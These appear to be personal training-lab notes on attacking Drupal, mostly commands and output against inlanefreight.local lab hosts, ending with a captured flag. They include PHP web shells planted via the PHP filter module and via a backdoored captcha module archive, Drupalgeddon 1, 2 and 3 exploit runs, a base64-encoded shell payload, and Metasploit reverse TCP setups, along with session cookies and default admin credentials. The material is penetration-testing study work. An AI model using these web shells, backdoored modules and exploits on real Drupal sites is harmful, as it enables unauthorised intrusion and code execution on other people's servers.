# Attacking Drupal

## Leveraging the PHP Filter Module

### Before version 8

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module.

http://drupal-qa.inlanefreight.local/#overlay=admin/modules

Tick the check box PHP filter
Save Configuration
Content
Add content and create a Basic page

<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

Set Text format drop-down to PHP code

Redirected to a new page : http://drupal-qa.inlanefreight.local/node/3

curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Version 8 onwards

PHP Filter module is not installed by default

Install module :

wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
Administration > Reports > Available updates
Browse
Install

## Uploading a Backdoored Module

Adding a shell to an existing module

wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

vi shell.php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>

vi .htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

On Drupal with administrative access :
Manage
Extend
+ Install new module
Browse to the backdoored Captcha archive
Install

curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Leveraging Known Vulnerabilities

### Drupalgeddon
https://www.drupal.org/SA-CORE-2014-005

It affects versions 7.0 up to 7.31 and was fixed in version 7.32

Exploit :

https://www.exploit-db.com/exploits/34992
Enable the PHP Filter module
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

http://http://drupal-qa.inlanefreight.local/user#overlay=admin/people

We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.


### Drupalgeddon 2

https://www.drupal.org/sa-core-2018-002

It affects versions of Drupal prior to 7.58 and 8.5.1

Exploit :
https://www.exploit-db.com/exploits/44448

python3 drupalgeddon2.py 
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
Check: http://drupal-dev.inlanefreight.local/hello.txt

curl -s http://drupal-dev.inlanefreight.local/hello.txt
;-)

<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

python3 drupalgeddon2.py
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
Check: http://drupal-dev.inlanefreight.local/mrb3n.php


curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Drupalgeddon 3

Remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x

https://cvedetails.com/cve/CVE-2018-7602/

It requires a user to have the ability to delete a node.

1) Log On and obtain a valid session Cookie
2) msf6 exploit(multi/http/drupal_drupageddon)
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local 
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
show options 
exploit

meterpreter > getuid
Server username: www-data (33)


meterpreter > sysinfo
Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux

## LAB

### /etc/hosts

10.129.142.40

IP=10.129.142.40
printf "%s\t%s\n\n" "$IP" "drupal.inlanefreight.local drupal-qa.inlanefreight.local drupal-dev.inlanefreight.local" | sudo tee -a /etc/hosts

http://drupal.inlanefreight.local/

### Recon

sudo pip3 install droopescan
droopescan scan drupal -u drupal.inlanefreight.local

[+] Possible version(s):
    8.9.0
    8.9.1

sudo pip3 install droopescan
droopescan scan drupal -u drupal-qa.inlanefreight.local

[+] Possible version(s):
    7.30

sudo pip3 install droopescan
droopescan scan drupal -u drupal-dev.inlanefreight.local


### Drupalgeddon

https://www.exploit-db.com/download/34992
python2.7 34992.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

SESS7480629f2a60f8ea10a4824d0c05b9ed=1IWySveI9e3uN7q-k6xK2Zx6JJO8EYuiTIn1CVPQjps

### Drupalgeddon 3

sudo msfconsole -q
use exploit/multi/http/drupal_drupageddon
set rhosts 10.129.205.173
set VHOST drupal-qa.inlanefreight.local
set drupal_session SESS7480629f2a60f8ea10a4824d0c05b9ed=j5d_-oxDPEgmzSjimzNZzHqO9lEQBgDwW--l2mNoDug;
set DRUPAL_NODE 1
set LHOST 10.10.15.142
show options 
exploit

searchsploit Drupalgeddon3
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticate | php/webapps/44542.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticate | php/webapps/44557.rb
---------------------------------------------- ---------------------------------
Shellcodes: No Results

sudo cp /usr/share/exploitdb/exploits/php/webapps/44557.rb /root/.msf4/modules/

updatedb

sudo mkdir /root/.msf4/modules/exploits/
sudo mkdir /root/.msf4/modules/exploits/php/
sudo mkdir /root/.msf4/modules/exploits/php/webapps/

sudo cp /usr/share/exploitdb/exploits/php/webapps/44557.rb /root/.msf4/modules/exploits/php/webapps/

[msf](Jobs:0 Agents:0) >> search 44557
[-] No results from search
[msf](Jobs:0 Agents:0) >> updatedb
[*] exec: updatedb

/usr/bin/find: '/home/htb-ac-786011/.cache/doc': Permission denied
[msf](Jobs:0 Agents:0) >> 

[msf](Jobs:0 Agents:0) >> reload_all

[msf](Jobs:0 Agents:0) >> search 44557

Matching Modules
================

   #  Name                       Disclosure Date  Rank       Check  Description
   -  ----                       ---------------  ----       -----  -----------
   0  exploit/php/webapps/44557  2018-04-29       excellent  No     Drupalgeddon3


Interact with a module by name or index. For example info 0, use 0 or use exploit/php/webapps/44557

use 0
set rhosts 10.129.142.40
set VHOST drupal-qa.inlanefreight.local
set drupal_session SESS7480629f2a60f8ea10a4824d0c05b9ed=1IWySveI9e3uN7q-k6xK2Zx6JJO8EYuiTIn1CVPQjps
set DRUPAL_NODE 1
set LHOST 10.10.15.142
show options 
exploit

[*] Started reverse TCP handler on 10.10.15.142:4444 
[*] Token Form -> Sg7iwAOpw2BvxzZeJkABgPx7YhgKBXtnV6U5ys6BZkA
[*] Token Form_build_id -> form-UW9HNdZZb-tqSZWqrW24TU_7kU0BtN2_P4GonZatfHw
[*] Exploit completed, but no session was created.


### RCE through PHP page

http://drupal-qa.inlanefreight.local/#overlay=admin/modules

--> Failed no PHP type of basic page

### drupal-dev.inlanefreight.local

IP=10.129.189.125
printf "%s\t%s\n\n" "$IP" "drupal.inlanefreight.local drupal-qa.inlanefreight.local drupal-dev.inlanefreight.local" | sudo tee -a /etc/hosts

sudo pip3 install droopescan
droopescan scan drupal -u drupal-dev.inlanefreight.local

[+] No plugins found.                                                           

[+] No themes found.

[+] Possible version(s):
    8.5.0
    8.5.0-rc1
    8.5.1
    8.5.2
    8.5.3
    8.5.4
    8.5.5
    8.5.6

[+] Possible interesting urls found:
    Default admin - http://drupal-dev.inlanefreight.local/user/login

http://drupal-dev.inlanefreight.local/user/login
admin
admin

SESS1870755745b9b67ba28e06f87f264552=ZpXCP9O1aCK1ZOrDt6FNRbNZdVOoIIRn5F6VKPOa8AU

https://www.exploit-db.com/download/34992
python2.7 34992.py -t http://drupal-dev.inlanefreight.local -u hacker -p pwnd

[X] NOT Vulnerable :(

sudo msfconsole -q

sudo mkdir /root/.msf4/modules/exploits/
sudo mkdir /root/.msf4/modules/exploits/php/
sudo mkdir /root/.msf4/modules/exploits/php/webapps/

sudo cp /usr/share/exploitdb/exploits/php/webapps/44557.rb /root/.msf4/modules/exploits/php/webapps/

[msf](Jobs:0 Agents:0) >> reload_all

search 44557

use exploit/php/webapps/44557
set rhosts 10.129.189.125
set VHOST drupal-dev.inlanefreight.local
set drupal_session SESS1870755745b9b67ba28e06f87f264552=ZpXCP9O1aCK1ZOrDt6FNRbNZdVOoIIRn5F6VKPOa8AU
set DRUPAL_NODE 1
set LHOST 10.10.15.142
show options 
exploit

[*] Started reverse TCP handler on 10.10.15.142:4444 
[-] Exploit failed: NoMethodError undefined method `first' for nil:NilClass
[*] Exploit completed, but no session was created.

--> Failed

http://drupal-dev.inlanefreight.local/#overlay=admin/modules


wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

vi shell.php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>

vi .htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

On Drupal with administrative access :
Manage
Extend
+ Install new module
Browse to the backdoored Captcha archive
Install

Fatal error: Cannot use result of built-in function in write context in /var/www/drupal-qa.inlanefreight.local/modules/system/system.tar.inc on line 595



### http://drupal.inlanefreight.local/

admin
admin

SESSd16c26469c92a0d76aee595fed22fe6c=6awXwH5xDh5pEwkDeprGwc492TgPeCLQfGjIuhq7QmI

use exploit/php/webapps/44557
set rhosts 10.129.189.125
set VHOST drupal.inlanefreight.local
set drupal_session SESSd16c26469c92a0d76aee595fed22fe6c=6awXwH5xDh5pEwkDeprGwc492TgPeCLQfGjIuhq7QmI
set DRUPAL_NODE 1
set LHOST 10.10.15.142
show options 
exploit

set VHOST drupal-qa.inlanefreight.local
set drupal_session SESS7480629f2a60f8ea10a4824d0c05b9ed=q9DCwaEKp8aoXyx6eUpUdWQL6MIeJr7QVEGcmdkFrKY;

[*] Started reverse TCP handler on 10.10.15.142:4444 
[*] Token Form -> DBs3g6EeGKCvz4cIs33SM0Z81LGIwavkVHAyS6_nMeM
[*] Token Form_build_id -> form-oGBR_Ec9LDR4EW5RSYxYG2T_u-IdBYnX_GCcH9PFHxE
[*] Exploit completed, but no session was created.


mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

On Drupal with administrative access :
Manage
Extend
+ Install new module
Browse to the backdoored Captcha archive
Install

http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=ls%20-l%20%2Fvar%2Fwww%2Fdrupal.inlanefreight.local

total 240 -rw-r--r-- 1 www-data www-data 95 Jun 17 2020 INSTALL.txt -rw-r--r-- 1 www-data www-data 18092 Nov 16 2016 LICENSE.txt -rw-r--r-- 1 www-data www-data 5924 Jun 17 2020 README.txt -rw-r--r-- 1 www-data www-data 313 Jun 17 2020 autoload.php -rw-r--r-- 1 www-data www-data 3052 Jun 17 2020 composer.json -rw-r--r-- 1 www-data www-data 151483 Jun 17 2020 composer.lock drwxr-xr-x 12 www-data www-data 4096 Jun 17 2020 core -rw-r--r-- 1 www-data www-data 1507 Jun 17 2020 example.gitignore -rw-r--r-- 1 root root 26 Sep 21 2021 flag_6470e394cbf6dab6a91682cc8585059b.txt -rw-r--r-- 1 www-data www-data 549 Jun 17 2020 index.php drwxr-xr-x 5 www-data www-data 4096 Sep 16 2021 modules drwxr-xr-x 2 www-data www-data 4096 Jun 17 2020 profiles -rw-r--r-- 1 www-data www-data 1594 Jun 17 2020 robots.txt drwxr-xr-x 3 www-data www-data 4096 Jun 17 2020 sites drwxr-xr-x 2 www-data www-data 4096 Jun 17 2020 themes -rw-r--r-- 1 www-data www-data 848 Jun 17 2020 update.php drwxr-xr-x 20 www-data www-data 4096 Jun 17 2020 vendor -rw-r--r-- 1 www-data www-data 4566 Jun 17 2020 web.config

http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=cat%20%2Fvar%2Fwww%2Fdrupal.inlanefreight.local%2Fflag_6470e394cbf6dab6a91682cc8585059b.txt
DrUp@l_drUp@l_3veryWh3Re!

